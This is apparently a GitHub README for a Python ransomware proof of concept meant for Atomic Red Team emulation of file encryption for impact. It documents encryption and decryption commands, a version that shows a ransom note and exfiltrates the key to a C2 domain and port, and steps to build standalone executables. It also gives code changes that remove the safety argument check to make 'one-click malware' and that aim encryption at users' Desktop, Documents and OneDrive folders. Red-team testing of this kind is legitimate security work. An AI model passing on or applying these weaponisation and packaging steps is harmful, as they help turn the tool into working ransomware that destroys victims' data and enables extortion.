# Ransomware-PoC
A simple python ransomware PoC that can be used for Atomic Red Team: **ATT&CK Technique: Data Encrypted for Impact (T1486)**. The project is built off [CryptSky](https://github.com/deadPix3l/CryptSky) and full credits goes to deadPix3l for his code. The updated code demonstrates a typical ransomware flow and it is just one of many ways to perform ransomware encryption.

 TLDR:
 1. Generates AES key to encrypt local file (hardcoded in PoC).
 2. The attacker's embedded RSA public key (intentionally hardcoded in PoC) is used to encrypt the AES key. The private key is already stored in the attacker's C2 server. The encrypted text is sent to the C2 server and displayed for the victim.
 3. Ransom note is shown. When the ransom is paid, a decryptor is provided. 
 
**Warning**: Be extra careful of running the program as it will modify files. Ensure the path is correct and be wary in running with administrative privileges.

# Supported
* python3 (python2 for Linux/macOS should work)
* Windows, Linux and macOS

# Versions
There are two versions:

Version 1: main.py
- Basic version - Terminal Only

Version 2: main_v2.py
- Advanced version
- Ransom note pop up
- Exfiltrate key back to C2 given domain and port

# How to run
Install dependencies:
```bash
pip3 install pycryptodome
```

Default:
```
Encrypt: python3 main.py -e or python3 main_v2.py -e
Decrypt: python3 main.py -d or python3 main_v2.py -e
```

Windows with specific path:
```
Encrypt: python3 main_v2.py -p "C:\users\jimmy\desktop\test_ransomware" -e
Decrypt: python3 main_v2.py -p "C:\users\jimmy\desktop\test_ransomware" -d
```

Linux/macOS with specific path:
```
Encrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -e
Decrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -d
```

Variables to change:
* Ransomware Extension [default: .wasted for WastedLocker]
* AES Key
* RSA Public key
* RSA Private key (to be removed). Only used for decryptor.
* Domain and port for exfiltration (main_v2)

NB: As this is simply a PoC for Atomic Red Team, there is no real need to change the keys or other variables.

# Standalone Executable
Tested with python 2.7 with pyinstaller 3.6 and python 3.7 with pyinstaller 4.0. Please note that python 3.8 with pyinstaller 4.0 have known issues as this was incompatible with macOS.

Windows and Linux:
```bash
pip3 install pyinstaller
pyinstaller --onefile main_v2.py or py -m PyInstaller --onefile main_v2.py
```

macOS:
```
(python 3.7)
python3 -m pip install pyinstaller
pyinstaller --onefile main_v2.py

(python 2.7)
pip install -I pyinstaller==3.6
python -m PyInstaller --onefile main_v2.py
```

See `/bin` folder for binaries.


Windows with specific path:
```
Encrypt: main_v2.exe -p "C:\users\jimmy\desktop\test_ransomware" -e
Decrypt: main_v2.exe -p "C:\users\jimmy\desktop\test_ransomware" -d
```

Linux with specific path:
```
Encrypt: ./main_v2 -p "/home/jimmy/test_ransomware" -e
Decrypt: ./main_v2 -p "/home/jimmy/test_ransomware" -d
```

macOS with specific path:
```
Encrypt: ./main_v2_macos_py2 -p "/Users/jimmy/test_ransomware" -e
Decrypt: ./main_v2_macos_py2 -p "/Users/jimmy/test_ransomware" -d
```

## Miscellaneous 
### One-click execution

I originally added arguments to prevent accidental clicks and mess up. To simulate a one-click malware, comment and uncomment the following:

Comment
```python
if len(sys.argv) <= 1:
    print('[*] Ransomware - PoC\n')
    # banner()        
    print('Usage: python3 main.py -h')
    print('{} -h for help.'.format(sys.argv[0]))
    exit(0)

# Parse arguments
args = parse_args()
encrypt = args.encrypt
decrypt = args.decrypt

absolute_path = str(args.path)
 ```   

Uncomment
```python
absolute_path = "None"
encrypt = True 
decrypt = False
```

### Multiple folders
There is support for multiple paths, add them as such:

```python
startdirs = [os.environ['USERPROFILE'] + '\\Desktop', 
                        os.environ['USERPROFILE'] + '\\Documents',
                        os.environ['USERPROFILE'] + '\\Music',
                        os.environ['USERPROFILE'] + '\\Desktop',
                        os.environ['USERPROFILE'] + '\\Onedrive']
```

# Demo
#### Version 1
![Ransomware-PoC](/demo/download.gif)

#### Version 2
![main_v2-PoC](/demo/main_v2.png)


# Additional Features
* Added RSA asymmetric encryption of the AES key.
* Added autodetection on Windows, Linux or macOS.
* Added path argument to specify a directory.
* Fixed handling of renaming files with adding/removing of the ransomware extension.
* Added ransomware note pop up.
* Added exfiltration of key back to C2.

# Credit
- [CryptSky](https://github.com/deadPix3l/CryptSky) (deadPix3l and contributors) for base project
- [Demonware (Cerberus)](https://github.com/StrangerealIntel/Cerberus/blob/abd7d069edc2009a33ae1102f54abc935452e766/Demonware/2020-09-15/Demonware.py)  (StrangerealIntel) for ransom image and exfiltration
